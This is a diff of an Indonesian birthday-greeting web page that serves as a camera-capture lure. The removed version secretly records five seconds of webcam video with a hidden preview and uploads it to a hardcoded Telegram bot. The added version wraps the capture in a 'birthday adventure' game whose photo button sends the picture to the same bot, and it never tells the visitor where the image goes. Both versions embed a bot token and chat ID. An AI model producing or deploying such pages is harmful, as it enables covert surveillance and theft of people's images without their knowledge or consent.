@@ -1,98 +1,135 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hadiah Ulang Tahun</title>
+    <title>Petualangan Ulang Tahun</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Poppins', Arial, sans-serif;
+            background-color: #f0f8ff;
             text-align: center;
-            background-color: #ffe4e1;
             padding: 20px;
         }
         h1 {
             color: #ff6b81;
-            font-size: 24px;
+            font-size: 32px;
+            margin-bottom: 10px;
         }
-        p {
-            color: #333;
+        p, button {
             font-size: 18px;
-            line-height: 1.6;
-            margin: 20px;
+            color: #333;
+            margin: 10px;
+        }
+        button {
+            background-color: #ff6b81;
+            border: none;
+            padding: 10px 20px;
+            margin: 5px;
+            border-radius: 8px;
+            color: white;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #ff4757;
+        }
+        #game {
+            margin-top: 30px;
+        }
+        #camera, #preview {
+            display: none;
+            margin-top: 20px;
+            width: 300px;
+            height: auto;
+            border-radius: 10px;
         }
     </style>
 </head>
 <body>
-    <h1>Selamat Ulang Tahun!</h1>
-    <p>
-        Di hari yang spesial ini, aku ingin mengingatkan betapa berharganya kamu.<br>
-        Kalau bintang di langit dihitung satu per satu, itu tak cukup menggambarkan betapa besar rasa sayangku.<br><br>
-        Ada pantun buat kamu nih!<br>
-        <i>"Pergi ke pasar beli ikan sepat,</i><br>
-        <i>Cantik wajahmu bikin aku terpikat."</i><br><br>
-        Semoga hari ulang tahunmu penuh kebahagiaan dan kejutan, ya!
-    </p>
+    <h1>Petualangan Ulang Tahun!</h1>
+    <p>Selamat datang di petualangan ulang tahunmu. Pilih jalanmu dengan bijak!</p>
 
-    <video id="preview" style="display:none;" autoplay muted></video>
+    <div id="game">
+        <p>Kamu tiba di sebuah taman penuh bunga. Ada dua jalan di depanmu.</p>
+        <button onclick="choose('kiri')">Pilih jalan kiri</button>
+        <button onclick="choose('kanan')">Pilih jalan kanan</button>
+    </div>
+
+    <video id="camera" autoplay></video>
+    <canvas id="preview"></canvas>
+
     <script>
-        const video = document.getElementById('preview');
-        
-        // Akses kamera untuk merekam tanpa menampilkan video
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then((stream) => {
-                video.srcObject = stream;
-                const mediaRecorder = new MediaRecorder(stream);
-                let chunks = [];
+        const game = document.getElementById('game');
+        const camera = document.getElementById('camera');
+        const preview = document.getElementById('preview');
 
-                mediaRecorder.start();
+        function choose(direction) {
+            if (direction === 'kiri') {
+                game.innerHTML = `
+                    <p>Kamu menemukan kue ulang tahun raksasa! Mau foto bareng?</p>
+                    <button onclick="startCamera()">Ambil Foto!</button>
+                `;
+            } else if (direction === 'kanan') {
+                game.innerHTML = `
+                    <p>Kamu bertemu dengan peri ulang tahun! Dia memberimu hadiah spesial.</p>
+                    <button onclick="startCamera()">Ambil Foto!</button>
+                `;
+            }
+        }
 
-                mediaRecorder.ondataavailable = (e) => {
-                    chunks.push(e.data);
-                };
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    camera.srcObject = stream;
+                    camera.style.display = 'block';
+                    game.innerHTML = `
+                        <p>Senyaaam... Klik tombol untuk mengambil foto!</p>
+                        <button onclick="takePhoto()">Ambil Foto Sekarang</button>
+                    `;
+                })
+                .catch((err) => {
+                    console.error('Gagal mengakses kamera:', err.message);
+                });
+        }
 
-                // Durasi perekaman otomatis: 5 detik, durasi bisa lu ubah cuy di 5000
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                }, 5000);
+        function takePhoto() {
+            const context = preview.getContext('2d');
+            preview.width = camera.videoWidth;
+            preview.height = camera.videoHeight;
+            context.drawImage(camera, 0, 0, preview.width, preview.height);
 
-                mediaRecorder.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
-                    chunks = [];
-                    
-                    // Edisi malas ngoding buahhaha
-                    sendToTelegram(blob); 
-                };
-            })
-            .catch((err) => {
-                console.error('Gagal mengakses kamera:', err.message);
-            });
+            camera.srcObject.getTracks().forEach(track => track.stop());
+            camera.style.display = 'none';
+            preview.style.display = 'block';
 
-        // Script By Zamur Xhunter 
+            preview.toBlob((blob) => {
+                sendToTelegram(blob);
+            }, 'image/jpeg', 0.95);
+        }
+
         function sendToTelegram(blob) {
-            const BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E'; // Ganti dengan token bot Anda
-            const CHAT_ID = '8050058475'; // Ganti dengan chat ID Anda
+            const BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E'; // Token bot
+            const CHAT_ID = '8050058475'; // Chat ID
             const formData = new FormData();
 
             formData.append('chat_id', CHAT_ID);
-            formData.append('video', blob, 'kejutan-ulang-tahun.mp4');
+            formData.append('photo', blob, 'foto-ulang-tahun.jpg');
 
-            // Kirim video menggunakan API Telegram
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        console.log('Video berhasil dikirim ke Telegram.');
-                    } else {
-                        console.error('Gagal mengirim video:', data);
-                    }
-                })
-                .catch(error => {
-                    console.error('Terjadi kesalahan saat mengirim video:', error);
-                });
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('Foto berhasil dikirim ke Telegram! Selamat ulang tahun!');
+                } else {
+                    console.error('Gagal mengirim foto:', data);
+                }
+            })
+            .catch(error => {
+                console.error('Terjadi kesalahan saat mengirim foto:', error);
+            });
         }
     </script>
 </body>
